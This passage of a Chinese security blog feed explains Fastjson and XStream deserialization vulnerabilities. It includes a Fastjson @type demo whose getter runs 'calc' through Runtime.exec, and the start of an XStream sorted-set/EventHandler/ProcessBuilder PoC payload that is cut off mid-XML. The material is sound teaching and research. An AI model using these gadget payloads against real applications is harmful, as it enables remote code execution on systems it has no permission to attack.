&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">...</span><br><span class="line">        ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>整个解析过程相当复杂，知道结论就ok了。</p><p><strong>小结一下</strong></p><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><h3 id="PoC写法"><a href="#PoC写法" class="headerlink" title="PoC写法"></a>PoC写法</h3><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"@type"</span>:<span class="string">"xxx.xxx.xxx"</span>,</span><br><span class="line"><span class="attr">"xxx"</span>:<span class="string">"xxx"</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p><ol><li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li><li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li></ol><h3 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h3><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FJTest2.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可弹计算器：</p><p><img src="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/1.png" alt=""></p><p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><hr><p>OK，Fastjson反序列化漏洞的一些基本概念原理就写到这了，下一篇写2017年的Fastjson 1.2.22-1.2.24 反序列化漏洞。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java XStream反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/10/21/XStream反序列化漏洞/</id>
    <published>2019-10-21T15:19:07.000Z</published>
    <updated>2019-11-03T10:25:21.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="XStream简介"><a href="#XStream简介" class="headerlink" title="XStream简介"></a>XStream简介</h3><p>XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。</p><h3 id="使用XStream实现序列化与反序列化"><a href="#使用XStream实现序列化与反序列化" class="headerlink" title="使用XStream实现序列化与反序列化"></a>使用XStream实现序列化与反序列化</h3><p>下面看下如何使用XStream进行序列化和反序列化操作的。</p><p>先定义IPerson.java接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着定义Person类实现前面的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">IPerson</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">output</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"Hello, this is "</span> + <span class="keyword">this</span>.name + <span class="string">", age "</span> + <span class="keyword">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XStream序列化是调用XStream.toXML()来实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        String xml = xstream.toXML(p);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>6<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将输出结果保存为person.xml文件。</p><p>XStream反序列化是用过调用XStream.fromXML()来实现的，其中获取XML文件内容的方式可以通过Scanner()或FileInputStream都可以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("person.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"person.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, this is mi1k7ea, age 6</span><br></pre></td></tr></table></figure><h3 id="Java动态代理机制"><a href="#Java动态代理机制" class="headerlink" title="Java动态代理机制"></a>Java动态代理机制</h3><p>在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。</p><p>通过动态代理机制，可以为某一个对象动态生成一个代理对象来替代对原对象的访问，可以有效地控制对原对象的访问并且能够很好地隐藏和保护原对象，此外还能在原对象函数的基础上添加一些额外的操作，如打印日志等。</p><p>具体的可参考：<a href="https://www.mi1k7ea.com/2019/02/01/Java动态代理机制/">Java动态代理机制</a></p><h3 id="EventHandler类"><a href="#EventHandler类" class="headerlink" title="EventHandler类"></a>EventHandler类</h3><p>EventHandler类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p><p>EventHandler类是实现了InvocationHandler的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接。</p><p>EventHandler类定义的代码如下，其含有target和action属性，在EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">private</span> String action;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">                Method targetMethod = Statement.getMethod(</span><br><span class="line">                             target.getClass(), action, argTypes);</span><br><span class="line">                ...</span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点看下EventHandler.invokeInternal()函数的代码逻辑，如注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line"><span class="comment">//-------------------------------------part1----------------------------------</span></span><br><span class="line"><span class="comment">//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称</span></span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        <span class="keyword">if</span> (var2.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Integer(System.identityHashCode(var1));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1 == var3[<span class="number">0</span>] ? Boolean.TRUE : Boolean.FALSE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.getClass().getName() + <span class="string">'@'</span> + Integer.toHexString(var1.hashCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//-------------------------------------part2----------------------------------</span></span><br><span class="line"><span class="comment">//貌似获取了一个class和object</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.listenerMethodName != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.listenerMethodName.equals(var4)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class[] var5 = <span class="keyword">null</span>;</span><br><span class="line">            Object[] var6 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.eventPropertyName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Object var7 = <span class="keyword">this</span>.applyGetters(var3[<span class="number">0</span>], <span class="keyword">this</span>.getEventPropertyName());</span><br><span class="line">                var6 = <span class="keyword">new</span> Object[]&#123;var7&#125;;</span><br><span class="line">                var5 = <span class="keyword">new</span> Class[]&#123;var7 == <span class="keyword">null</span> ? <span class="keyword">null</span> : var7.getClass()&#125;;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> var12 = <span class="keyword">this</span>.action.lastIndexOf(<span class="number">46</span>);</span><br><span class="line">                <span class="keyword">if</span> (var12 != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.target = <span class="keyword">this</span>.applyGetters(<span class="keyword">this</span>.target, <span class="keyword">this</span>.action.substring(<span class="number">0</span>, var12));</span><br><span class="line">                    <span class="keyword">this</span>.action = <span class="keyword">this</span>.action.substring(var12 + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//--------------------------------------part3----------------------------------------</span></span><br><span class="line"><span class="comment">//var13获取了method的名称, var13=public java.lang.Process java.lang.ProcessBuilder.start() throws java.io.IOException</span></span><br><span class="line">                Method var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="keyword">this</span>.action, var5);</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//判断var13是否为空,当然不为空啦</span></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var13 = Statement.getMethod(<span class="keyword">this</span>.target.getClass(), <span class="string">"set"</span> + NameGenerator.capitalize(<span class="keyword">this</span>.action), var5);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (var13 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    String var9 = var5.length == <span class="number">0</span> ? <span class="string">" with no arguments"</span> : <span class="string">" with argument "</span> + var5[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"No method called "</span> + <span class="keyword">this</span>.action + <span class="string">" on "</span> + <span class="keyword">this</span>.target.getClass() + var9);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//-------------------------------------part4----------------------------------</span></span><br><span class="line"><span class="comment">//调用invoke,调用函数,执行命令</span></span><br><span class="line">                    <span class="keyword">return</span> MethodUtil.invoke(var13, <span class="keyword">this</span>.target, var6);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//------------------------------------------------------------------------------</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var10) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(var10);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                Throwable var8 = var11.getTargetException();</span><br><span class="line">                <span class="keyword">throw</span> var8 <span class="keyword">instanceof</span> RuntimeException ? (RuntimeException)var8 : <span class="keyword">new</span> RuntimeException(var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Converter转换器"><a href="#Converter转换器" class="headerlink" title="Converter转换器"></a>Converter转换器</h3><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p><p>转换器需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><p>具体参考：<a href="http://x-stream.github.io/converters.html" target="_blank" rel="noopener">http://x-stream.github.io/converters.html</a></p><p><strong>DynamicProxyConverter</strong></p><p>DynamicProxyConverter即动态代理转换器，是XStream支持的一种转换器，其存在使得XStream能够把XML内容反序列化转换为动态代理类对象：</p><p><img src="/2019/10/21/XStream反序列化漏洞/23.png" alt=""></p><p>XStream反序列化漏洞的PoC都是以DynamicProxyConverter这个转换器为基础来编写的。</p><p>以官网给的例子为例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Blah<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Woo<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"com.foo.MyHandler"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">something</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</p><h2 id="0x02-XStream反序列化漏洞"><a href="#0x02-XStream反序列化漏洞" class="headerlink" title="0x02 XStream反序列化漏洞"></a>0x02 XStream反序列化漏洞</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>在1.4.x系列版本中，&lt;=1.4.6或=1.4.10是存在反序列化漏洞的。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>XStream是自己实现的一套序列化和反序列化机制，核心是通过Converter转换器来将XML和对象之间进行相互的转换，这便与原生的Java序列化和反序列化机制有所区别，因此两者的反序列化漏洞也是有着很大区别的。</p><p>XStream反序列化漏洞的存在是因为XStream支持一个名为DynamicProxyConverter的转换器，该转换器可以将XML中dynamic-proxy标签内容转换成动态代理类对象，而当程序调用了dynamic-proxy标签内的interface标签指向的接口类声明的方法时，就会通过动态代理机制代理访问dynamic-proxy标签内handler标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即dynamic-proxy标签内的handler标签指向如EventHandler类这种可实现任意函数反射调用的恶意类、interface标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p><h3 id="几种PoC浅析"><a href="#几种PoC浅析" class="headerlink" title="几种PoC浅析"></a>几种PoC浅析</h3><h4 id="基于sorted-set的PoC"><a href="#基于sorted-set的PoC" class="headerlink" title="基于sorted-set的PoC"></a>基于sorted-set的PoC</h4><h5 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h5><p>1.4.5，1.4.6，1.4.10</p><h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>复现用的XStream版本是1.4.6。</p><p>payload1.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span 